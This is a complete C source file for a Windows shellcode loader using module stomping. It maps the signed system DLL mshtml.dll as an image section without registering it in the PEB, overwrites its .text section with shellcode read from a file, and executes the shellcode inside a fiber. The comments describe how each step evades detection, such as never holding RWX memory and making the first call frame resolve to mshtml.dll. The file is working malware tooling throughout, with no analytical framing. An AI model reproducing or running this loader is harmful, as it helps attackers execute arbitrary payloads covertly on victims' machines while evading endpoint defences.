/*
 * Shellcode Loader - Module Stomping via Section Mapping + Fiber Execution
 *
 * Reads raw shellcode from argv[1], maps a sacrificial signed system DLL
 * as a SEC_IMAGE section (no LoadLibrary, no PEB registration), overwrites
 * its .text with the shellcode (RW -> RX), and executes it inside a fiber.
 *
 * Build (MSVC x64):
 *   cl /nologo /O2 /W3 loader.c /link ntdll.lib
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/*  Minimal NT declarations not fully covered by <winternl.h>          */
/* ------------------------------------------------------------------ */

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040L
#endif

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif

#ifndef ViewShare
#define ViewShare 1
#endif

#ifndef ViewUnmap
#define ViewUnmap 2
#endif

/* FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, etc. if missing */
#ifndef FILE_OPEN
#define FILE_OPEN 0x00000001
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif

/* IO_STATUS_BLOCK / UNICODE_STRING / OBJECT_ATTRIBUTES come from
   <winternl.h> on modern SDKs. Provide fallbacks if absent. */

#ifndef _NTDEF_
typedef LONG NTSTATUS;
#endif

/* Prototypes for the NT functions we use. Signatures match the public
   NT documentation (ntifs.h / phnt) so the linker resolves against ntdll. */

typedef NTSTATUS (NTAPI *pNtCreateFile)(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
);

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE             SectionHandle,
    HANDLE             ProcessHandle,
    PVOID             *BaseAddress,
    ULONG_PTR          ZeroBits,
    SIZE_T             CommitSize,
    PLARGE_INTEGER     SectionOffset,
    PSIZE_T            ViewSize,
    DWORD              InheritDisposition,
    ULONG              AllocationType,
    ULONG              Win32Protect
);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE             ProcessHandle,
    PVOID              BaseAddress
);

typedef NTSTATUS (NTAPI *pNtClose)(
    HANDLE             Handle
);

/* ------------------------------------------------------------------ */
/*  Helpers                                                            */
/* ------------------------------------------------------------------ */

static BOOL ReadShellcode(const char *path, PBYTE *out, SIZE_T *outSize)
{
    FILE *fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[-] fopen(%s) failed\n", path);
        return FALSE;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return FALSE; }
    long sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return FALSE; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return FALSE; }

    PBYTE buf = (PBYTE)malloc((size_t)sz);
    if (!buf) { fclose(fp); return FALSE; }

    size_t rd = fread(buf, 1, (size_t)sz, fp);
    fclose(fp);
    if (rd != (size_t)sz) { free(buf); return FALSE; }

    *out = buf;
    *outSize = (SIZE_T)sz;
    return TRUE;
}

/* Build a UNICODE_STRING from a wide literal (non-owning). */
static void InitUnicodeString(PUNICODE_STRING us, PCWSTR s)
{
    us->Buffer        = (PWSTR)s;
    us->Length        = (USHORT)(wcslen(s) * sizeof(WCHAR));
    us->MaximumLength = (USHORT)(us->Length + sizeof(WCHAR));
}

/* Locate the .text section inside a mapped PE image. */
static BOOL FindTextSection(PVOID base, PBYTE *textAddr, SIZE_T *textSize)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        /* match ".text" exactly (name field is 8 bytes, may not be NUL) */
        if (sec->Name[0] == '.' &&
            sec->Name[1] == 't' &&
            sec->Name[2] == 'e' &&
            sec->Name[3] == 'x' &&
            sec->Name[4] == 't')
        {
            *textAddr = (PBYTE)base + sec->VirtualAddress;
            *textSize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize
                                              : sec->SizeOfRawData;
            return (*textSize > 0);
        }
    }
    return FALSE;
}

/* ------------------------------------------------------------------ */
/*  Fiber trampoline                                                   */
/* ------------------------------------------------------------------ */

typedef struct _FIBER_CTX {
    PVOID code;
} FIBER_CTX;

static VOID CALLBACK FiberStart(PVOID param)
{
    FIBER_CTX *ctx = (FIBER_CTX *)param;
    /* Execute shellcode as a function pointer */
    ((void (*)(void))ctx->code)();
    /* If shellcode returns, exit the fiber cleanly */
    ExitThread(0);
}

/* ------------------------------------------------------------------ */
/*  main                                                               */
/* ------------------------------------------------------------------ */

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    /* 1. Read shellcode from file */
    PBYTE  shellcode = NULL;
    SIZE_T scSize    = 0;
    if (!ReadShellcode(argv[1], &shellcode, &scSize)) {
        fprintf(stderr, "[-] failed to read shellcode\n");
        return 1;
    }
    printf("[+] loaded %zu bytes of shellcode from %s\n", scSize, argv[1]);

    /* 2. Resolve NT functions from ntdll (loaded in every process). */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        fprintf(stderr, "[-] ntdll not found\n");
        free(shellcode);
        return 1;
    }

    pNtCreateFile         NtCreateFile_        = (pNtCreateFile)        GetProcAddress(ntdll, "NtCreateFile");
    pNtCreateSection      NtCreateSection_     = (pNtCreateSection)     GetProcAddress(ntdll, "NtCreateSection");
    pNtMapViewOfSection   NtMapViewOfSection_  = (pNtMapViewOfSection)  GetProcAddress(ntdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection_= (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    pNtClose              NtClose_             = (pNtClose)             GetProcAddress(ntdll, "NtClose");

    if (!NtCreateFile_ || !NtCreateSection_ || !NtMapViewOfSection_ ||
        !NtUnmapViewOfSection_ || !NtClose_) {
        fprintf(stderr, "[-] failed to resolve NT functions\n");
        free(shellcode);
        return 1;
    }

    /* 3. Open the sacrificial signed DLL. mshtml.dll is large, signed,
          and rarely touched at runtime on modern Windows. */
    const WCHAR *dllPath = L"\\??\\C:\\Windows\\System32\\mshtml.dll";

    UNICODE_STRING uPath;
    InitUnicodeString(&uPath, dllPath);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb = {0};
    HANDLE hFile = NULL;

    NTSTATUS st = NtCreateFile_(
        &hFile,
        FILE_READ_DATA | SYNCHRONIZE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    if (!NT_SUCCESS(st) || !hFile) {
        fprintf(stderr, "[-] NtCreateFile failed: 0x%08lX\n", (unsigned long)st);
        free(shellcode);
        return 1;
    }

    /* 4. Create a SEC_IMAGE section from the DLL. This maps the DLL as a
          proper image without registering it in the PEB loader list. */
    HANDLE hSection = NULL;
    st = NtCreateSection_(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile);

    NtClose_(hFile);

    if (!NT_SUCCESS(st) || !hSection) {
        fprintf(stderr, "[-] NtCreateSection(SEC_IMAGE) failed: 0x%08lX\n", (unsigned long)st);
        free(shellcode);
        return 1;
    }

    /* 5. Map a view. Start with RW so we can write, then narrow to RX
          after writing. No RWX is ever held. */
    PVOID  base = NULL;
    SIZE_T viewSize = 0;

    st = NtMapViewOfSection_(
        hSection,
        GetCurrentProcess(),
        &base,
        0,
        0,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_READWRITE);

    if (!NT_SUCCESS(st) || !base) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n", (unsigned long)st);
        NtClose_(hSection);
        free(shellcode);
        return 1;
    }

    printf("[+] mapped sacrificial image at %p (size=0x%zx)\n", base, viewSize);

    /* 6. Find the .text section inside the mapped image. */
    PBYTE  textAddr = NULL;
    SIZE_T textSize = 0;
    if (!FindTextSection(base, &textAddr, &textSize)) {
        fprintf(stderr, "[-] could not locate .text in mapped image\n");
        NtUnmapViewOfSection_(GetCurrentProcess(), base);
        NtClose_(hSection);
        free(shellcode);
        return 1;
    }

    printf("[+] .text at %p (size=0x%zx)\n", textAddr, textSize);

    if (scSize > textSize) {
        fprintf(stderr, "[-] shellcode (%zu) larger than .text (%zu)\n", scSize, textSize);
        NtUnmapViewOfSection_(GetCurrentProcess(), base);
        NtClose_(hSection);
        free(shellcode);
        return 1;
    }

    /* 7. Make .text writable, copy shellcode in, then restore to RX.
          We do NOT keep RWX at any point. */
    DWORD oldProt = 0;
    if (!VirtualProtect(textAddr, scSize, PAGE_READWRITE, &oldProt)) {
        fprintf(stderr, "[-] VirtualProtect(RW) failed: %lu\n", GetLastError());
        NtUnmapViewOfSection_(GetCurrentProcess(), base);
        NtClose_(hSection);
        free(shellcode);
        return 1;
    }

    memcpy(textAddr, shellcode, scSize);
    /* wipe our staging buffer */
    SecureZeroMemory(shellcode, scSize);
    free(shellcode);
    shellcode = NULL;

    if (!VirtualProtect(textAddr, scSize, PAGE_EXECUTE_READ, &oldProt)) {
        fprintf(stderr, "[-] VirtualProtect(RX) failed: %lu\n", GetLastError());
        NtUnmapViewOfSection_(GetCurrentProcess(), base);
        NtClose_(hSection);
        return 1;
    }

    FlushInstructionCache(GetCurrentProcess(), textAddr, scSize);

    printf("[+] shellcode staged at %p, executing via fiber\n", textAddr);

    /* 8. Execute inside a fiber — no new thread-start pointing at the
          stomped image, and the first frame resolves to mshtml.dll. */
    if (!IsThreadAFiber()) {
        if (!ConvertThreadToFiber(NULL)) {
            fprintf(stderr, "[-] ConvertThreadToFiber failed: %lu\n", GetLastError());
            NtUnmapViewOfSection_(GetCurrentProcess(), base);
            NtClose_(hSection);
            return 1;
        }
    }

    FIBER_CTX ctx;
    ctx.code = textAddr;

    PVOID hFiber = CreateFiber(0, FiberStart, &ctx);
    if (!hFiber) {
        fprintf(stderr, "[-] CreateFiber failed: %lu\n", GetLastError());
        NtUnmapViewOfSection_(GetCurrentProcess(), base);
        NtClose_(hSection);
        return 1;
    }

    SwitchToFiber(hFiber);

    /* Should not reach here if shellcode never returns. */
    DeleteFiber(hFiber);
    NtUnmapViewOfSection_(GetCurrentProcess(), base);
    NtClose_(hSection);

    printf("[+] done\n");
    return 0;
}
